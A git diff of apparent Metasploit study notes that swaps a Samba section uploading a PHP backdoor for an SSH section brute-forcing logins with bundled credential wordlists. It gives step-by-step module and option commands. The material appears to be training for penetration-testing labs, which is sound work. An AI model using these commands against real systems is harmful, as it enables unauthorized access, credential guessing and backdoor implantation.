@@ -78,37 +78,31 @@ Example: `grep exploit search unreal`
 
 `run` or `exploit`
 
-## Samba FTP
+##  SSH
 
 1. Start by searching for exploit based on port number and NMAP scan results of the NMAP -sV -O scan of your taget with the greatest number of open ports.
 
 2. Now lets use the auxiliary smb exploit
 
-`use auxiliary/admin/smb/upload_file`
+`use auxiliary/scanner/ssh/ssh_login`
 
 3. Next use the `show options` command to show the options required to execute the exploit
 
 `show options`
 
+
+
 4. Set the required options
 
 `set rhosts xxx.xxx.xxx.xxx`
 
-`set rport 445`
+`set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt`
 
-`set rport_ftp 21`
+`run` or `exploit`
 
-`set smbshare public`
+5. Try another password file by using the set USERPASS_FILE command.s
 
-`set smbuser chewbacca`
-
-`set lpath /tmp/backdoor.php`
-
-`set rpath backdoor.php`
-
-`set lhost xxx.xxx.xxx.xxx` (this should be your kali linux IP address)
-
-`set lport 4444` (Port on your system exploit and payload runs to create session)
+`set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt`
 
 `run` or `exploit`
 
